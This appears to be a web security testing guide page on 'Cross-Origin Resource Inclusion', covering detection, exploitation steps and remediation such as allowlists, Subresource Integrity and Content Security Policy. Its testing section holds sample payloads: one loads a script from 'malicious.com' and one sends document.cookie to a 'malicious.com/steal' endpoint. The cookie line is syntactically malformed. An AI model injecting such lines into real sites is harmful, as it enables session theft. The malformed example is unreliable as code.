# WSTG-CLNT-13: Testing for Cross-Origin Resource Inclusion (CORI)

## Summary

Cross-Origin Resource Inclusion (CORI) vulnerabilities occur when a web application allows external resources (e.g., scripts, stylesheets, or images) to be included or loaded from untrusted sources. This can lead to unauthorized data exfiltration, execution of malicious scripts, or other security issues.

## Objective

To identify and exploit scenarios where an application improperly includes cross-origin resources, enabling attackers to inject malicious resources or exfiltrate sensitive data.

## How to Test

### Step 1: Identify External Resource Inclusion
1. Inspect the application for externally loaded resources, such as:
   - JavaScript files
   - CSS files
   - Images
   - Fonts

2. Analyze resource loading mechanisms:
   - Dynamic imports (e.g., `import()`, `require()`)
   - DOM manipulation methods (e.g., `createElement('script')`, `appendChild()`)

---

### Step 2: Analyze Resource Inclusion Behavior
1. Check the application for hardcoded external URLs in:
   - HTML tags (`<script>`, `<link>`, `<img>`)
   - Inline JavaScript
   - API calls that dynamically load resources

2. Review how external resource URLs are validated:
   - Are URLs dynamically constructed using user input?
   - Is validation performed to restrict sources?

---

### Step 3: Test for CORI Vulnerabilities
1. **Inject Malicious External Resources**:
   - Replace external resource URLs with attacker-controlled URLs:
     ```html
     <script src="https://malicious.com/malware.js"></script>
     ```

2. **Manipulate Dynamic Imports**:
   - Test if user-controlled input affects dynamically loaded resources:
     ```javascript
     const script = document.createElement('script');
     script.src = userInput; // Test for input control
     document.body.appendChild(script);
     ```

3. **Analyze for Data Exfiltration**:
   - Inject resources that attempt to exfiltrate sensitive data:
     ```javascript
     <img src="https://malicious.com/steal?cookie=" + document.cookie>
     ```

---

### Step 4: Validate Exploitation
1. Confirm if the application includes and executes the malicious resource.
2. Assess the impact, such as:
   - Unauthorized data exfiltration (e.g., cookies, tokens).
   - Execution of malicious scripts.
   - Integrity compromise through CSS or DOM manipulation.

---

## Tools

- **Browser Developer Tools** for inspecting included resources.
- **Burp Suite** or **OWASP ZAP** for intercepting and modifying requests.
- **Custom JavaScript Payloads** to manipulate resource inclusion dynamically.
- **CURL** or **Postman** for testing resource URLs.

---

## Remediation

1. **Validate and Restrict Included Resources**:
   - Implement a strict allowlist of trusted domains for resource inclusion.
   - Avoid dynamically constructing resource URLs using user input.

2. **Use Subresource Integrity (SRI)**:
   - Add integrity attributes to `<script>` and `<link>` tags to ensure resources are not tampered with:
     ```html
     <script src="https://example.com/script.js" integrity="sha384-xyz" crossorigin="anonymous"></script>
     ```

3. **Enforce Content Security Policy (CSP)**:
   - Restrict allowed sources for scripts, styles, and other resources using CSP:
     ```http
     Content-Security-Policy: script-src 'self' https://trusted.com;
```     

4. **Regularly Audit Included Resources**:
   - Periodically review and verify all external resources for security and reliability.

5. **Avoid Inline Resource Loading**:
   - Minimize the use of inline resource inclusion to reduce potential attack vectors.

---

## References

- [OWASP Testing Guide - CORI Testing](https://owasp.org/www-project-testing/)
- [MDN Web Docs - Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP Top Ten - A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [W3C - Subresource Integrity](https://www.w3.org/TR/SRI/)

---
